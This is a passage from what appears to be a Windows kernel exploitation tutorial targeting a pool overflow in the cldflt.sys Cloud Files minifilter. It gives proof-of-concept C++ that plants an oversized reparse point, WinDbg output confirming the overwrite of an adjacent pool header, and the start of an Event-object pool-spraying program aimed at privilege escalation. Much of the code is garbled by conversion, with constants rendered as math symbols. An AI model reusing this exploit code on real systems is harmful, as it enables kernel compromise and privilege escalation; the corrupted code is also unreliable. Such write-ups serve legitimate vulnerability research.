garbage and problems. memset(payload.get(), PAYLOAD\_INITIAL\_BYTE, PAYLOAD\_OFFSET); // Fill first $\\Theta \\times 1 \\Theta \\Theta \\Theta$\
\
and not the entire buffer. \*(UINT )(payload.get() $^ +$ PAYLOAD\_OFFSET) $=$ DEADBEEF;\
\
$\\star$ $\\odot \\times$\
\
[https://exploitreversing.com](https://exploitreversing.com/) \*(UINT\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ 0x4) = 0x12345678; $\\star$ (UINT\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta$ ) = 0xABCDEF00; $\\star$ (UINT $\\star$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\mathsf { C }$ ) $=$ $\\Theta \\times$ C0DEC0DE; int rc $=$ BuildAndSetCloudFilesReparsePoint(hFile, PAYLOAD\_SIZE\_OVERFLOW,\
\
payload.get()); if ${ \\mathsf { r c } } \\quad ! = \\quad \\odot ,$ ) { wprintf(L"\[-\] BuildAndSetCloudFilesReparsePoint failed\\n"); } CloseHandle(hFile); printf("\[+\] Opening file again to check the file\\n"); HANDLE hFile1 $=$ CreateFileW( filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL ); if (hFile1 $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"\[-\] Open file failed! error=%lu\\n", GetLastError()); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] File reopened successfully, handle $=$ %p\\n", hFile1); CloseHandle(hFile1); printf("\[i\] File handle closed again\\n"); CfUnregisterSyncRoot(syncRootPath); wprintf(L"\[i\] Sync root unregistered. File left in place: %s\\n", filePath) CoTaskMemFree(appDataPath); return $r c = 0$ ) ? 0 : 1;\
\
}\
\
The output follows below:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>POOL\_OVERFLOW.exe $\[ + \]$ Sync root directory ensured: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot $\[ + \]$ Sync root registered at C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot \[i\] Existing file deleted: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06 $\[ + \]$ File created: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06 $\[ + \]$ BtBufferSize: 0x108C\
\
$\[ \+ \]$ BtRp header: \[-\] $+ \\Theta \\cal { 4 }$ : magic=0x70527442 \[-\] $+ \\Theta 8$ : crc=0xA31262C9 \[-\] $+ \\infty C$ : ushortLen=4236 \[-\] $\\yen 10$ : flags=0x0002\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
\[-\] $\\yen 12$ : numberOfElements=5\
\
\[-\] totalSize=4236\
\
\[+\] BtRpData bas $e = \\Theta \\times 3 C$ \[-\] elements\[0\]: type $\\scriptstyle : = 0 \\times \\Theta ^ { \\prime }$ len $^ { = 1 }$ off $\\therefore = Q \\times 6 \\textcircled { 2 }$ \[-\] elements\[1\]: type=0x07 len $^ { = 1 }$ o $\_ { 1 } + 1 = 0 \\times 6 4$ \[-\] elements\[2\]: type=0x07 len $^ { = 1 }$ off=0x68 \[-\] elements\[3\]: type=0x06 len $\\mathtt { = 8 }$ off=0x6C \[-\] elements\[4\]: type=0x11 len $\\mathbf { \\equiv }$ 4112 off $\\yen 0$\
\
\[+\] FeRp size: $\\Theta \\times 1 1 \\Theta 8$\
\
$\[ \+ \]$ FeRp header: \[-\] $+ \\Theta \\Theta$ : version=0x0001 \[-\] $+ \\textcircled { \\cdot } 2$ : structSize=4360 -\] $+ \\Theta \\cal { 4 }$ : magic=0x70526546 \] $+ \\Theta 8$ : crc=0xD7F7A2DA \] $+ \\infty C$ : dwordLen=4356 \[-\] $\\yen 10$ : flags=0x0002 \[-\] $\\yen 12$ : max\_elements $\\tt { \\tt = 1 6 }$\
\
$\[ \+ \]$ Computed totalSize=4360\
\
$\[ \+ \]$ FeRpData bas $e { = } \\Theta \\times 6 4$ (reserved 10 descriptors)\
\
\[-\] elements\[0\]: type\[-\] elements\[1\]: type\[-\] elements\[2\]: type $\\mathtt { \\mathtt { \\mathtt { \\mathtt { \\mathtt { \\Lambda } = 0 \\times 0 7 } } } }$ len len len $^ { = 1 }$ off off off $\\Longrightarrow 0 \\times 6 \\Theta$ $\\mathtt { \\Pi } = \\Theta \\times \\Theta \\mathsf { A }$ $\\mathord { = } 4$ $= 0 \\times 6 4$ =0x06 $\\mathtt { = 8 }$ $= 0 \\times 6 8$ \[-\] elements\[3\]: type=0x11 len $\\mathord { = } 4$ off=0x6C\
\
\[-\] elements\[4\]: type $\\mathtt { = 0 } \\mathtt { \\times 1 } 1$ len $= 4 2 3 6$ off $\\yen 0$\
\
$\[ \+ \]$ Compressed FeRp size: 0x1D3\
\
$\[ \+ \]$ DeviceIoControl (FSCTL\_SET\_REPARSE\_POINT\_EX) succeeded (file)\
\
$\[ \+ \]$ GET\_REPARSE (file): tag=0x9000601A, len=471, total=479\
\
$\[ \+ \]$ Opening file again to check the file\
\
$\[ \+ \]$ File reopened successfully, handle=0000000000000250\
\
\[i\] File handle closed again\
\
\[i\] Sync root unregistered. File left in place: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06 \[Figure 105\]: REPARSE\_POINT\_2 program output\
\
The reparse point content follows:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>fsutil reparsepoint query "C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06"\
\
Reparse Tag Value : 0x9000601a Tag value: Microsoft Tag value: Directory\
\
Reparse Data Length: 0x1d7\
\
Reparse Data:\
\
0000: 01 80 08 11 b5 b1 00 46 65 52 70 da a2 f7 d7 00 .FeRp.\
\
0010: 04 11 00 00 02 00 0a 00 80 07 00 01 00 60 00 00\
\
0020: 00 48 08 04 00 64 00 38 06 00 08 00 82 68 00 1c .H...d.8.....h..\
\
0030: 11 00 04 00 6c 02 1c 58 8c 10 78 00 1c 21 08 99 ....l..X..x..!..\
\
0040: 00 48 01 0d 04 06 33 00 0e 09 04 42 74 52 70 40 .H....3....BtRp@\
\
0050: c9 62 12 a3 8c 10 01 77 05 7f 06 77 01 7f 01 77 .b.....w.⌂.w.⌂.w\
\
0060: 01 07 01 77 01 7f 03 77 10 cf 26 77 01 67 05 77 ...w.⌂.w..&w.g.w\
\
0070: 01 0b cd ab 03 01 01 0b fe ab ff 00 ff 80 7f 20 ..⌂\
\
0080: 7f 10 7f 10 7f 10 7f 10 ff 7f 10 3f 08 3f 04 3f ⌂.⌂.⌂.⌂..⌂.?.?.?\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/e2b76b7d01316247f9145638eb66fd92e262e259a8c283a8ff0627761577b3f9.jpg)\
\
\[Figure 106\]: reparse point content\
\
The most meaningful output comes from WinDbg, which shows that the pool\_overflow program has reached the second memcpy function (represented as memmove function by IDA Pro) within HsmIBitmapNORMALOpen routine, which didn’t happen in the first reparse\_point program, and mainly that it has overwritten the first bytes of the next pool, as show below:\
\
0: kd> bl 0 e Disable Clear fffff807\`67df9220 0001 (0001)\
\
cldflt!HsmpCtxCreateStreamContext 1 e Disable Clear fffff807\`67debf10 0001 (0001) cldflt!HsmIBitmapNORMALOpen 2 e Disable Clear fffff807\`67dd4fc0 0001 (0001) cldflt!HsmpRpValidateBuffer 3 e Disable Clear fffff807\`67de4528 0001 (0001)\
\
cldflt!HsmpBitmapIsReparseBufferSupported 4 e Disable Clear fffff807\`67dec511 0001 (0001)\
\
cldflt!HsmIBitmapNORMALOpen+0x601 5 e Disable Clear fffff807\`67dec5ea 0001 (0001)\
\
cldflt!HsmIBitmapNORMALOpen+0x6da\
\
0: kd> g\
\
Breakpoint 0 hit\
\
cldflt!HsmpCtxCreateStreamContext:\
\
fffff807\`67df9220 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
1: kd> g\
\
Breakpoint 2 hit\
\
cldflt!HsmpRpValidateBuffer:\
\
fffff807\`67dd4fc0 48895c2410 mov qword ptr \[rsp+10h\],rbx\
\
1: kd> g\
\
Breakpoint 0 hit\
\
cldflt!HsmpCtxCreateStreamContext:\
\
fffff807\`67df9220 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
0: kd> g\
\
Breakpoint 2 hit\
\
cldflt!HsmpRpValidateBuffer:\
\
fffff807\`67dd4fc0 48895c2410 mov qword ptr \[rsp+10h\],rbx\
\
0: kd> g\
\
Breakpoint 3 hit\
\
cldflt!HsmpBitmapIsReparseBufferSupported:\
\
fffff807\`67de4528 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
0: kd> g\
\
Breakpoint 1 hit\
\
cldflt!HsmIBitmapNORMALOpen:\
\
fffff807\`67debf10 488bc4 mov rax,rsp\
\
0: kd> g\
\
Breakpoint 4 hit\
\
cldflt!HsmIBitmapNORMALOpen+0x601:\
\
fffff807\`67dec511 e8aacffbff call cldflt!memcpy (fffff807\`67da94c0)\
\
0: kd> g\
\
Breakpoint 0 hit\
\
cldflt!HsmpCtxCreateStreamContext:\
\
fffff807\`67df9220 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
0: kd> g\
\
Breakpoint 2 hit\
\
cldflt!HsmpRpValidateBuffer:\
\
fffff807\`67dd4fc0 48895c2410 mov qword ptr \[rsp+10h\],rbx\
\
0: kd> g\
\
Breakpoint 3 hit\
\
cldflt!HsmpBitmapIsReparseBufferSupported:\
\
fffff807\`67de4528 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
0: kd> g\
\
Breakpoint 1 hit\
\
cldflt!HsmIBitmapNORMALOpen:\
\
fffff807\`67debf10 488bc4 mov rax,rsp\
\
0: kd> g\
\
Breakpoint 5 hit\
\
cldflt!HsmIBitmapNORMALOpen+0x6da:\
\
fffff807\`67dec5ea e8d1cefbff call cldflt!memcpy (fffff807\`67da94c0) 0: kd> r rcx, rdx, r8d\
\
rcx=ffffa2880e913000 rdx=ffffa2880da570fc r8d=1010\
\
0: kd> db rdx+1000 L20\
\
ffffa288\`0da580fc ef be ad de 78 56 34 12-00 ef cd ab de c0 de c0 ....xV4. ffffa288\`0da5810c 00 00 00 00 e2 79 e3 7b-ef f0 ea f1 00 00 00 00 .....y.{.. 0: kd> db rcx+1000 L20\
\
ffffa288\`0e914000 00 70 15 00 00 00 00 00-00 60 01 00 00 00 00 00 .p. ffffa288\`0e914010 ff ff ff ff 00 00 00 00-00 00 00 00 00 00 00 00\
\
0: kd> dt n cx+1000 $+ \\Theta \\times \\Theta \\Theta \\Theta$ PreviousSize : 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta \\Theta$ PoolIndex : 0y01110000 (0x70) $+ \\Theta \\times \\Theta \\Theta 2$ BlockSize 0y00010101 (0x15) $+ \\Theta \\times \\Theta \\Theta 2$ PoolType 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta \\Theta$ Ulong1 : 0x157000 $+ \\Theta \\times \\Theta \\Theta 4$ PoolTag : 0 $+ \\Theta \\times \\Theta \\Theta 8$ ProcessBilled : 0x00000000\`00016000 \_EPROCESS $+ \\Theta \\times \\Theta \\Theta 8$ AllocatorBackTraceIndex : 0x6000 $+ \\Theta \\times \\Theta \\Theta \\alpha$ PoolTagHash : 1\
\
0: kd> p\
\
cldflt!HsmIBitmapNORMALOpen+0x6df:\
\
fffff807\`67dec5ef 8b4710 mov eax,dword ptr \[rdi+10h\]\
\
0: kd> db ffffa2880e913000+1000 L20\
\
ffffa288\`0e914000 ef be ad de 78 56 34 12-00 ef cd ab de c0 de c0 ...xV4.\
\
ffffa288\`0e914010 ff ff ff ff 00 00 00 00-00 00 00 00 00 00 00 00\
\
0: kd> dt nt!\_POOL\_HEADER ffffa2880e913000+1000 $+ \\Theta \\times \\Theta \\Theta \\Theta$ PreviousSize : 0y11101111 (0xef) $+ \\Theta \\times \\Theta \\Theta \\Theta$ PoolIndex : 0y10111110 (0xbe)\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/70148fa3c28b2fe1152b6b4f2cdc1b59ad142dba27de35007ad45ecbfa3ced7d.jpg)\
\
\[Figure 107\]: WinDbg session: proving the overflow\
\
According to the WinDbg output, rcx register points to the original destination, rdx register points to the source, and r8d register contain the length of the payload, which is $0 \\times 1 0 1 0$ and is clearly bigger than the limit of $0 \\times 1 0 0 0$ bytes that was allocated by the minifilter driver. Another interesting aspect is to notice is that, after executing the vulnerable code, the old rcx register continue holding the same destination address and not the new value of rcx register.\
\
In terms of Assembly code, the WinDbg clearly shows the hit from the last breakpoint:\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/798a1eaf6296ec9567cc4bcd7506c3463e983f67712570b91a3fd19e3e942587.jpg)\
\
\[Figure 108\]: WinDbg Assembly\
\
Readers should reconfirm it by comparing it with the pseudo-code once again:\
\
{ if ( (\_DWORD)Offset\_Element\_04 && (\_WORD)Length\_Element\_04\_1 ) Src $=$ (char $\\star$ )HsmData\_01 $^ +$ Offset\_Element\_04; else $S r c = \\odot L L$ ; Element\_Length $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ HsmData\_01->ElementInfos\[4\].Length;\
\
status\_04 = 0; } if ( status\_04 < 0 ) Element\_Length $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; } if ( Src && Element\_Length - $1 \ < = \ 0 \\times$ FFE ) { Length\_Element\_04\_02 $=$ Element\_Length; v43 = \*(\_DWORD $\\star$ )&Src\[Element\_Length - 4\]; p\_buffer\_dest $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); ptr\_buffer\_01->buffer $=$ (unsigned \_\_int64)p\_buffer\_dest; if ( p\_buffer\_dest ) { memmove(p\_buffer\_dest, Src, Element\_Length); if ( Element\_Length < 4092 ) { index $=$ ((4091 - Element\_Length) >> 2) + 1; } else { ptr\_buffer\_02 $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); ptr\_buffer\_01->buffer $=$ (unsigned \_\_int64)ptr\_buffer\_02; if ( ptr\_buffer\_02 ) { memmove(ptr\_buffer\_02, Src, Element\_Length); LABEL\_116: Parameter\[0\] $=$ 0LL; HsmiBitmapNORMALGetNumberOfPlexCopies(ptr\_buffer\_01); HsmExpandKernelStackAndCallout( (PEXPAND\_STACK\_CALLOUT)HsmiBitmapNORMALOpenOnDiskCallout, (unsigned int $\\star$ )Parameter);\
\
# To help to obtain a better understanding of reasons that caused the adjacent pool has been overwritten, a summary of the important lines of the code follows below:\
\
static const USHORT PAYLOAD\_INITIAL\_BYTE $\\begin{array} { r l } { = } & { { } \\odot { \\times } \\mathsf { A B } } \\end{array}$ ; // This value can be aleatory, and in this case, I have used initials of my name.\
\
static const USHORT FERP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT BTRP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT COMPRESSED\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT REPARSE\_DATA\_SIZE $=$ $= 0 \\times 4 0 0 0$ ;\
\
static const USHORT PAYLOAD\_SIZE\_OVERFLOW $=$ 0x1010;\
\
static const USHORT PAYLOAD\_OFFSET $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ; std::unique\_ptr<char\[\]> payload(new char\[REPARSE\_DATA\_SIZE\]);\
\
memset(payload.get(), 0, REPARSE\_DATA\_SIZE); // Zero entire buffer to prevent garbage and problems.\
\
memset(payload.get(), PAYLOAD\_INITIAL\_BYTE, PAYLOAD\_OFFSET); // Fill first $\\Theta \\times 1 \\Theta \\Theta \\Theta$ and not the entire buffer.\
\
int rc $=$ BuildAndSetCloudFilesReparsePoint(hFile, PAYLOAD\_SIZE\_OVERFLOW, payload.get());\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/50485ab8ca259b809d17dc9fa916cf898242df311001d5ae340c926d2effba75.jpg)\
\
\[Figure 110\]: A few important lines from the pool\_overflow program\
\
\[Figure 111\]: \_POOL\_HEADER definition\
\
Finally, all pieces of this subsection are in the right place. As readers can notice, I have changed a few sizes to $0 \\times 4 0 0 0$ , which could be $0 \\times 2 0 0 0$ , $0 \\times 3 0 0 0$ or any other value, depending on how I could write the code. The value of PAYLOAD\_SIZE\_OVERFLOW is equal to 0x1010, and this value goes to bt\_elements\[4\].Length $=$ (USHORT)payload\_size line. If you check the reverse code shown above (memmove(ptr\_buffer\_02, Src, Element\_Length);) there is not any check to this limit, which allows us to overflow the destination buffer (ptr\_buffer\_02, which has been created with 0x1000 bytes) and overwrite the next and adjacent pool. Another point to check is that I also set up all fields exceeding the current pool chunk (highlighted in green above) with arbitrary values to make easier to spot them, and readers can change such values if it is necessary. By the way, in Windows 10 22H2, Windows 11 23H2 and 22H2, the \_POOL\_HEADER has the following structure:\
\
typedef struct \_POOL\_HEADER { union { struct { ULONG PreviousSize : 8; // Bits 0-7 (Byte 0) ULONG PoolIndex : 8; // Bits 8-15 (Byte 1) ULONG BlockSize : 8; // Bits 16-23 (Byte 2) ULONG PoolType : 8; // Bits 24-31 (Byte 3) }; ULONG Ulong1; // $+ \\odot \\times \\odot \\odot$ \[4 bytes\] }; ULONG PoolTag; // $+ \\odot \\times \\odot 4$ \[4 bytes\] union { EPROCESS \*ProcessBilled; // $+ \\odot \\times \\odot 8$ \[8 bytes on x64\] struct { USHORT AllocatorBackTraceIndex; USHORT PoolTagHash; }; };\
\
} POOL\_HEADER; // $\\Theta \\times \\bot \\Theta$ bytes total\
\
We achieved our goal and were able to overwrite a few bytes of the adjacent pool chunk.\
\
The next step is making use of this recently acquired capability to leak information from kernel and use such information to elevate privileges of execution.\
\
# 16.03. Corrupting and creating a fake pool using Event objects\
\
Previously, I corrupted the adjacent kernel pool using the existing memory layout, without introducing any new object or making use of any other common approaches commonly used in exploit development such as heap spraying, overlapping, or forcing any UAF condition. In this section, I will be using event objects and other object and techniques to obtain the same effect of the previous program (pool\_overflow) and create a fake pool header object and extend the BlockSize filter to cover 0x100 bytes ahead of the header. Readers can understand this subsection as preparation for the next subsection, but this time using an oversimplified configuration.\
\
I will be using Event object because it is simple enough to work with, predictable and with a well-defined structure. The task will be basically to spray a lot of event objects, free some of them and then refill the holes using the same event object, which could seem strange because it sounds like doing the same thing twice. That is necessary a side note about the choice of object types to fill the holes. No doubt, choosing different object types from the object used during the initial spray would be a logical and better choice to fill the holes mainly if we aim to leak pointer, and to pick up the same object type to refill holes does not seem reasonable. However, when we refill holes with new Event type objects their kernel addresses and handles will be different, and allocation addresses will be different too because the new allocations happen after the overflow. Therefore, we will have a layout similar to EVENT EXISTING ALLOCATED BUFFER (by driver) EVENT EVENT. Furthermore, returning to foundations, it is the same reason used for spraying objects, making holes and spray again because if we sprayed just once, we would never know what kind of object would come after the last sprayed object and what would be its pointers. When we force to create alternate holes and we fill them using a given object, we can be sure that the adjacent object type is exactly that one which we sprayed at the first moment.\
\
Windows event objects are one of many synchronization directives (there are interlocked functions, critical sections, mutexes, semaphores, SRWlock, etc.) that can be used to signal and coordinate threads and processes execution, and help to prevent two or more threads executing the same area of the code, which could cause data corruption. Events are created using CreateEventA/CreateEventW that transits to NtCreateEvent and is able to allocate \_KEVENT objects in the memory pool. The structure of \_KEVENT object is given by:\
\
|     |\
| --- |\
| struct \_KEVENT { |\
| struct \_DISPATCHER\_HEADER Header; |\
| }; |\
| struct \_LIST\_ENTRY |\
| { |\
| struct \_LIST\_ENTRY\* Flink; //0x0 |\
| struct \_LIST\_ENTRY\* Blink; //0x8 }; |\
|  |\
| struct \_DISPATCHER\_HEADER { |\
| union |\
| { |\
| volatile LONG Lock; //0x0 |\
| LONG LockNV; //0x0 |\
| struct |\
| { |\
| UCHAR Type; //0x0 |\
| UCHAR Signalling; //0x1 |\
| UCHAR Size; //0x2 |\
\
The total size of structure is $0 { \\times } 8$ (existing fields before WaitListHead field) $\\phantom { - } + 0 { \\times } 8$ (Flink) $\\phantom { - } + 0 { \\times } 8$ (Blink), whose total is ${ 0 } { \\times 1 } { 8 }$ (24 bytes), but if we try to allocate such object from NonPagedPool, it will be round up to 0x40 bytes due to the pool allocator granularity, which it is also the minimum pool chunk. Thus, the interval between 0x18 and 0x40 is simply filled with padding. Anyway, this size is not a problem for us because it is small, and memory-aligned.\
\
To corrupt the adjacent pool, I have created a new program named evtcorrupt.cpp, whose code follows below with relevant lines highlighted using distinct colors:\
\
#include <Windows.h> #include <cfapi.h> #include <winioctl.h> #include <ShlObj.h> #include <stdio.h> #include  #include <initguid.h> #include <guiddef.h>\
\
DEFINE\_GUID(ProviderId, $\\Theta \\times$ 1b4f2a33, $\\Theta \\times$ b1b3, $\\Theta \\times 4 \\Theta \\subset \\Theta$ , $\\Theta \\times \\mathsf { b a }$ , $\\Theta \\times 5 \ a$ , $\\Theta \\times \\Theta 6$ , $\\Theta \\times 3 4$ , $\\Theta \\times \\in \\mathsf { C }$ , $\\Theta \\times 6 3$ , $\\Theta \\times \\mathrm { d e }$ , $\\Theta \\times \\Theta \\Theta$ );\
\
#pragma comment(lib, "Cldapi.lib")\
\
typedef enum \_HSM\_CONSTANTS { HSM\_BITMAP\_MAGIC $=$ $= 0 \\times 7 0 5 2 7 4 4 2$ , HSM\_FILE\_MAGIC $=$ $\\Theta \\times 7 \\Theta 5 2 6 5 4 6$ , HSM\_DATA\_HAVE\_CRC $=$ $\\Theta \\times \\Theta 2$ , HSM\_ELEMENT\_TYPE\_UINT64 $=$ $\\Theta \\times \\Theta 6$ , HSM\_ELEMENT\_TYPE\_BYTE $=$ $\\Theta \\times \\Theta 7$ , HSM\_ELEMENT\_TYPE\_UINT32 = $\\Theta \\times \\Theta \\mathsf { A }$ , HSM\_ELEMENT\_TYPE\_MAX $=$ 0x10, HSM\_ELEMENT\_TYPE\_BITMAP $=$ $\\Theta \\times \\bot 1$ ,\
\
} HSM\_CONSTANTS; static const USHORT HSM\_HEADER\_SIZE $=$ $\\Theta \\times \\perp 4$ ;\
\
static const USHORT HSM\_ELEMENT\_INFO\_SIZE $=$ $\\Theta \\times \\Theta 8$ static const USHORT BTRP\_ALIGN $=$ $\\Theta \\times \\Theta 4$ ;\
\
static const USHORT FERP\_ALIGN $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT ELEMENT\_NUMBER $=$ $\\Theta \\times \\Theta 5$ ;\
\
static const USHORT MAX\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { A }$ ;\
\
static const USHORT VERSION\_VALUE $=$ $\\Theta \\times \\Theta \\Theta \\Theta 1$ ;\
\
static const USHORT ELEMENT\_START\_OFFSET $=$ $\\Theta \\times 6 \\Theta$ ;\
\
static const USHORT PAYLOAD\_INITIAL\_BYTE $\\begin{array} { r l } { = } & { { } \\odot { \\times } \\mathsf { A B } } \\end{array}$ ;\
\
static const USHORT FERP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT BTRP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT COMPRESSED\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT REPARSE\_DATA\_SIZE $=$ $= 0 \\times 4 0 0 0$ ;\
\
static const USHORT PAYLOAD\_SIZE\_OVERFLOW $=$ $\\Theta \\times 1 \\Theta 1 0$ ;\
\
static const USHORT PAYLOAD\_OFFSET $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ;\
\
static const DWORD SPRAY\_COUNT $=$ 5000;\
\
static const DWORD TARGET\_COUNT $=$ 1000;\
\
#pragma pack(push, 1)\
\
typedef struct \_HSM\_ELEMENT\_INFO { USHORT Type; USHORT Length; ULONG Offset;\
\
} HSM\_ELEMENT\_INFO, $\\star$ PHSM\_ELEMENT\_INFO;\
\
typedef struct \_HSM\_DATA { ULONG Magic; ULONG Crc32; ULONG Length; USHORT Flags; USHORT NumberOfElements; HSM\_ELEMENT\_INFO ElementInfos\[\];\
\
} HSM\_DATA, $\\star$ PHSM\_DATA;\
\
typedef struct \_HSM\_REPARSE\_DATA { USHORT Flags; USHORT Length; HSM\_DATA FileData;\
\
} HSM\_REPARSE\_DATA, $\\star$ PHSM\_REPARSE\_DATA;\
\
typedef struct \_REPARSE\_DATA\_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { UCHAR DataBuffer\[FERP\_BUFFER\_SIZE\]; } GenericReparseBuffer;\
\
} REPARSE\_DATA\_BUFFER, $\\star$ PREPARSE\_DATA\_BUFFER;\
\
typedef struct \_REPARSE\_DATA\_BUFFER\_EX { ULONG Flags; ULONG ExistingReparseTag; GUID ExistingReparseGuid; ULONGLONG Reserved; REPARSE\_DATA\_BUFFER ReparseDataBuffer;\
\
} REPARSE\_DATA\_BUFFER\_EX, $\\star$ PREPARSE\_DATA\_BUFFER\_EX;\
\
#pragma pack(pop)\
\
typedef enum \_HSM\_ELEMENT\_OFFSETS { ELEM\_TYPE $\\begin{array} { r l } { \\mathbf { \\Sigma } } { \\mathbf { \\Sigma } } = & { { } \\odot \\times \\odot \\odot \\mathbf { \\Sigma } } \\end{array}$ , ELEM\_LENGTH $=$ $\\Theta \\times \\Theta 2$ ,\
\
[https://exploitreversing.com](https://exploitreversing.com/) ELEM\_OFFSET $=$ $\\Theta \\times \\Theta 4$ ,\
\
} HSM\_ELEMENT\_OFFSETS;\
\
typedef enum \_HSM\_DATA\_OFFSETS { DATA\_MAGIC $=$ $\\Theta \\times \\Theta \\Theta$ , DATA\_CRC32 $=$ $\\Theta \\times \\Theta 4$ , DATA\_LENGHT $=$ $\\Theta \\times \\Theta 8$ , DATA\_FLAGS $=$ $\\Theta \\times \\Theta \ C$ , DATA\_NR\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { E }$ ,\
\
} HSM\_DATA\_OFFSETS;\
\
typedef enum \_HSM\_FERP\_OFFSETS { FERP\_VERSION $=$ $\\Theta \\times \\Theta \\Theta$ , FERP\_STRUCT\_SIZE $=$ $\\Theta \\times \\Theta 2$ , FERP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , FERP\_CRC $=$ $\\Theta \\times \\Theta 8$ , FERP\_LENGTH $=$ $= ~ \\odot \\times \\odot C$ , FERP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , FERP\_MAX\_ELEMS $=$ $\\Theta \\times 1 2$\
\
} HSM\_FERP\_OFFSETS;\
\
typedef enum \_HSM\_BTRP\_OFFSETS { BTRP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , BTRP\_CRC $=$ $\\Theta \\times \\Theta 8$ , BTRP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , BTRP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , BTRP\_MAX\_ELEMS $=$ $\\Theta \\times 1 2$\
\
} HSM\_BTRP\_OFFSETS;\
\
static ULONG Calculate\_CRC32(ULONG seed, const void\* buf, size\_t len) { ULONG crc $=$ ~seed; const unsigned char\* p $=$ (const unsigned char\*)buf; for (size\_t i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ len; ++i) { crc $\\Lambda =$ p\[i\]; for (int j $=$ 0; j < 8; ++j) { if (crc & 1) crc $=$ (crc >> 1) ^ $\\Theta \\times$ EDB88320; else crc $> > = ~ 1$ ; } } return ~crc;\
\
}\
\
static void ValidateBtRp(const char\* buffer\_btrp, int count, const HSM\_ELEMENT\_INFO\* elements, unsigned short totalSize) {\
\
printf("\\n \[+\] BtRp header:\\n"); printf(" \[-\] $+ \\odot 4$ : magi $\\mathsf { C } = \\odot \\mathsf { X } \_ { \\prime 0 } ^ { 0 \\prime } \\odot \\mathsf { 8 X } \\backslash$ n", $\\star$ (const UINT $\\star$ )(buffer\_btrp $^ +$ BTRP\_MAGIC)); printf(" \[-\] $+ \\odot 8$ : $\\mathsf { C } \\mathsf { r } \\mathsf { C } = \\odot \\times \_ { \\mathsf { \\Omega } ^ { \\prime } \\circ } ^ { \\circ \\prime } \\odot \\mathsf { 8 } \\times \\mathsf { \\Omega } \\mathsf { n } ^ { \\prime \\prime }$ , $\\star$ (const UINT\*)(buffer\_btrp $^ +$ BTRP\_CRC)); printf(" \[-\] $+ \\odot \\zeta$ : ushortLen $=$ %u\\n", $\\star$ (const USHORT $\\star$ )(buffer\_btrp $^ +$ BTRP\_LENGTH)); printf(" \[-\] $+ 1 9$ : flag $\\mathsf { S } = \\odot \\times \\mathsf { \\Omega } \_ { < 0 } ^ { 0 / } \\odot 4 \\mathsf { X } \\backslash \\mathsf { r }$ ", $\\star$ (const USHORT $\\star$ )(buffer\_btrp $^ +$ BTRP\_FLAGS)); printf(" \[-\] $+ 1 2$ : numberOfElements $=$ %u\\n", $\\star$ (const USHORT\*)(buffer\_btrp $^ +$ BTRP\_MAX\_ELEMS)); printf(" \[-\] totalSize $=$ %u\\n", totalSize); USHORT base $=$ (USHORT)(HSM\_HEADER\_SIZE $^ +$ count $\\star$ HSM\_ELEMENT\_INFO\_SIZE); printf $( 1 1 ) \\setminus \[ + \]$ BtRpData base $=$ 0x%X\\n", base);\
\
